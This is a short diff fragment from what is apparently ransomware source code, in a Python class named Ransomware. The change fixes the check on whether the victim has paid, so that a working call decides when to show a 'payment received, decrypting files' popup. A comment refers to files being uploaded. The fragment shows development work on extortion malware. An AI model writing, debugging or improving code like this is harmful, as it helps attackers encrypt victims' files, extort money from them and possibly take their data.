@@ -332,7 +332,7 @@ class Ransomware:
             if (counter == 60):
                 counter = 1
 
-                if (self.check_if_user_has_paid):
+                if (self.check_if_user_paid(initial_balance)):
                     # Waits until all the files has been uploaded before processing the payment   
 
                     popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
